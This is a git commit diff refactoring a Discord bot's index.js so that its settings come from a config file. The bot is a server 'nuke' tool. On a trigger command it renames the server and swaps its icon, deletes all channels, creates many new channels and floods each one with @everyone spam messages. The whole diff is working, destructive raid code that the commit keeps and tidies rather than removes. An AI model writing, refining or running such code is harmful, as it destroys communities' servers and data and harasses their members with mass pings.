2a170e4d3180a6edea642fc9456e1aff775f2bf9
りょう <143770907+VEDA00133912@users.noreply.github.com>
2024-06-29 17:25:08 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,16 +1,17 @@
 require('dotenv').config();
 const { Client, GatewayIntentBits, Collection } = require('discord.js');
 const { v4: uuidv4 } = require('uuid');
-
-const client = new Client({
-  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
-    });
-
 const fs = require('fs');
 const path = require('path');
 
+const config = require('./config.json'); 
+
+const client = new Client({
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
+});
+
 client.on('ready', () => {
-  console.log(`${client.user.name} is online`)
+    console.log(`${client.user.username} is online`);
 });
 
 client.login(process.env.token);
@@ -33,59 +34,55 @@ for (const file of eventFiles) {
     }
 }
 
-const createchannels = 20;
-const messages = 25;
-
-
 client.on('messageCreate', async message => {
-    if (message.content === '!nuke') {
+    if (message.content === config.commands[0].name) { // Check command from config
         const guild = message.guild;
 
         try {
-            console.log('change server name and icon...');
+            console.log('Changing server name and icon...');
             await Promise.all([
-                guild.setName('NUKED'),
+                guild.setName(config.serverName),
                 guild.setIcon(client.user.displayAvatarURL())
             ]);
-            console.log('server name and icon changed');
+            console.log('Server name and icon changed');
 
-            console.log('fetching all channels...');
+            console.log('Fetching all channels...');
             const channels = await guild.channels.fetch();
 
-            console.log('deleting channels...');
+            console.log('Deleting channels...');
             const deletePromises = channels.map(channel => channel.delete());
-            await Promise.allSettled(deletePromises); 
+            await Promise.allSettled(deletePromises);
 
             console.log('All channels have been deleted');
-          
-          console.log('creating channels...');
-          const createPromises = Array.from({ length: createchannels }, () =>
-              guild.channels.create({
-                  name: 'nuked',
-                  type: 0
-              }).catch(error => {
-                  console.error('Failed to create a channel:', error);
-              })
-          );
-          await Promise.all(createPromises);
-          console.log(`${createchannels} channels have been created!`);
 
-console.log('Sending messages...');
+            console.log('Creating channels...');
+            const createPromises = Array.from({ length: config.createChannels }, () =>
+                guild.channels.create({
+                    name: config.channelName,
+                    type: 0
+                }).catch(error => {
+                    console.error('Failed to create a channel:', error);
+                })
+            );
+            await Promise.all(createPromises);
+            console.log(`${config.createChannels} channels have been created!`);
+
+            console.log('Sending messages...');
             const newChannels = await guild.channels.fetch();
             const batchSize = 5;
             const sendPromises = [];
 
             newChannels.forEach(channel => {
                 const channelSendPromises = [];
-                for (let j = 0; j < messages; j++) {
+                for (let j = 0; j < config.messagesPerChannel; j++) {
                     const randomString = uuidv4().split('-')[0];
-                    channelSendPromises.push(channel.send(`@everyone \n NUKEEEEEEEED \n ${randomString}`).catch(error => {
+                    channelSendPromises.push(channel.send(`${config.messageContent}${randomString}`).catch(error => {
                         console.error(`Failed to send messages in channel ${channel.name}:`, error);
                     }));
 
                     if (channelSendPromises.length >= batchSize) {
                         sendPromises.push(Promise.all(channelSendPromises));
-                        channelSendPromises.length = 0; 
+                        channelSendPromises.length = 0;
                     }
                 }
                 if (channelSendPromises.length > 0) {
@@ -94,7 +91,7 @@ console.log('Sending messages...');
             });
 
             await Promise.all(sendPromises);
-            console.log(`messages have been sent in all new channels.`);
+            console.log(`Messages have been sent in all new channels.`);
         } catch (error) {
             console.error('Error during nuke process:', error);
         }
